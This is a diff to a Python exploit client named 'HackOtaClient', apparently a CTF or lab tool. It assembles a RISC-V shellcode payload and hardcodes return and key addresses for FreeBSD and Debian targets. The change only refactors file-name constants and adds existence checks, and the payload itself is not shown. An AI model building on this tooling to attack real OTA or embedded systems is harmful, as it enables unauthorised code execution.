@@ -38,6 +38,8 @@ class HackOtaClient:
     KEY_ADDRESS = {'FreeBSD': 0x147a0, 'Debian': 0x165b0}
     RETURN_ADDRESS = {'FreeBSD': 0x11c74, 'Debian': 0x11da4}
 
+    PAYLOAD_ASM = "payload.asm"
+    PAYLOAD_ELF = "payload.elf"
     PAYLOAD_BIN = "payload.bin"
 
     @staticmethod
@@ -119,15 +121,17 @@ class HackOtaClient:
         ]
 
     def write_payload(self):
-        with open("payload.asm", "w") as f:
+        with open(HackOtaClient.PAYLOAD_ASM, "w") as f:
             f.writelines(self.form_payload())
 
     def compile_payload(self):
-        assert os.path.exists("payload.elf")
-        cmd = "riscv64-unknown-elf-as -march=rv64ima payload.asm -o payload.elf"
-        subprocess.call(cmd,shell=True)
-        cmd = "riscv64-unknown-elf-objcopy -O binary --only-section=.text payload.elf payload.bin"
-        subprocess.call(cmd,shell=True)
+        assert os.path.exists(HackOtaClient.PAYLOAD_ASM)
+        cmd = f"riscv64-unknown-elf-as -march=rv64ima {HackOtaClient.PAYLOAD_ASM} -o {HackOtaClient.PAYLOAD_ELF}"
+        print(subprocess.call(cmd,shell=True))
+        assert os.path.exists(HackOtaClient.PAYLOAD_ELF)
+        cmd = f"riscv64-unknown-elf-objcopy -O binary --only-section=.text {HackOtaClient.PAYLOAD_ELF} {HackOtaClient.PAYLOAD_BIN}"
+        print(subprocess.call(cmd,shell=True))
+        assert os.path.exists(HackOtaClient.PAYLOAD_BIN)
 
         # Bytes representing the next frame pointer $fp and the buffer pointer
         # Total 16 bytes
